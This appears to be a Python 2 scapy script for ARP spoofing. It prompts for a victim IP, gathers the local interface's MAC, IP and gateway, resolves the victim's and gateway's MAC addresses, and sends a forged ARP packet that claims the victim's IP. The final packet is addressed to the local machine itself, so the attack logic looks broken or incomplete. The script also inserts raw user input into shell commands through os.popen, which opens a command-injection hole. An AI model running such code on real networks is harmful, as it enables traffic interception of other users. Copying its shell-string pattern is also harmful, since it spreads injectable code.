import netinfo
import subprocess, shlex, re
from scapy.all import *
import commands
from ifparser import Ifcfg

def MAC_parser(host):
    os.popen('ping -c 1 %s' % host)
    fields = os.popen('grep "%s " /proc/net/arp' % host).read().split()
    if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
        return fields[3]
    else:
        print 'no response from', host

victim_ip = raw_input("Input victim_ip : ")
ifdata = Ifcfg(commands.getoutput('ifconfig -a'))
ifdata.interfaces
eth0 = ifdata.get_interface('eth0')
eth0.BROADCAST
mac_add = eth0.hwaddr
ip_add = netinfo.get_ip('eth0')
strs =  subprocess.check_output(shlex.split('ip r l'))
match_string = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
gateway = re.search('default via ' + match_string, strs).group(1)
print "ip_add  : "+ip_add
print "mac_add : "+mac_add
print "gateway : "+gateway
if os.geteuid() != 0:
	sys.exit("*** Please run as root ***")
victim_MAC = MAC_parser(victim_ip)
print "victim_MAC  : "+victim_MAC
gateway_MAC = MAC_parser(gateway)
print 'gateway_MAC : ' + gateway_MAC
send(ARP(op=ARP.who_has, pdst=ip_add, psrc=victim_ip, hwdst=mac_add))
